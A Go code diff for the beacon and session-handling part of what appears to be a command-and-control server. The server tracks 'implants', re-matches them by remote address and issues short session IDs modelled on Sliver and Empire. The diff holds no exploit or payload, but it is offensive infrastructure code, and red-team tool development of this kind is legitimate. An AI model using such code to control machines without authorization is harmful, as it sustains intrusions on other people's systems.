@@ -2,12 +2,15 @@ package transport
 
 import (
 	"context"
+	"crypto/rand"
 	"crypto/tls"
+	"encoding/base32"
 	"encoding/json"
 	"fmt"
 	"net/http"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
 	"time"
 
@@ -173,13 +176,31 @@ func (s *Server) Start(listenAddr string) error {
 
 func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	sessionID := r.Header.Get("X-Session-ID")
-	if sessionID == "" {
-		sessionID = generateSessionID()
-	}
+	newSessionCreated := false
 	
 	s.sessionsMu.Lock()
-	session, exists := s.sessions[sessionID]
-	if !exists {
+	var session *Session
+	
+	if sessionID != "" {
+		// Session ID provided - find existing session
+		session, _ = s.sessions[sessionID]
+	}
+	
+	if session == nil {
+		// No session ID or session not found - try to match by RemoteAddr
+		// This handles the case where implant lost its session ID but is reconnecting
+		for id, existingSession := range s.sessions {
+			if existingSession.RemoteAddr == r.RemoteAddr {
+				session = existingSession
+				sessionID = id
+				break
+			}
+		}
+	}
+	
+	if session == nil {
+		// Truly new session - generate new ID
+		sessionID = generateSessionID()
 		session = &Session{
 			ID:          sessionID,
 			RemoteAddr:  r.RemoteAddr,
@@ -188,9 +209,17 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 			Metadata:    make(map[string]interface{}),
 		}
 		s.sessions[sessionID] = session
-		s.logger.Info("New session: %s from %s", sessionID, r.RemoteAddr)
+		newSessionCreated = true
+		// Don't log to stdout to avoid interrupting readline prompt
+		// Log will be written to file if file logging is enabled
+		s.logger.Debug("New session: %s from %s", sessionID, r.RemoteAddr)
 	} else {
+		// Existing session - update LastSeen
 		session.LastSeen = time.Now()
+		// Update RemoteAddr in case it changed (NAT, etc.)
+		if session.RemoteAddr != r.RemoteAddr {
+			session.RemoteAddr = r.RemoteAddr
+		}
 	}
 	s.sessionsMu.Unlock()
 	
@@ -212,6 +241,11 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(response)
+	
+	// Trigger notification for new sessions (only for truly new ones)
+	if newSessionCreated {
+		// This will be handled by syncSessionsWithContext
+	}
 }
 
 func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
@@ -307,7 +341,12 @@ func (s *Server) getPendingTasks(sessionID string) []map[string]interface{} {
 }
 
 func generateSessionID() string {
-	return fmt.Sprintf("sess-%d", time.Now().UnixNano())
+	// Generate short session ID similar to Sliver/Empire (8-10 characters)
+	// Use base32 encoding for readability (no ambiguous chars like 0/O, 1/I)
+	bytes := make([]byte, 6)
+	rand.Read(bytes)
+	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(bytes)
+	return strings.ToLower(encoded[:8]) // Use first 8 characters
 }
 
 // EnqueueTask adds a task to the queue for a specific session
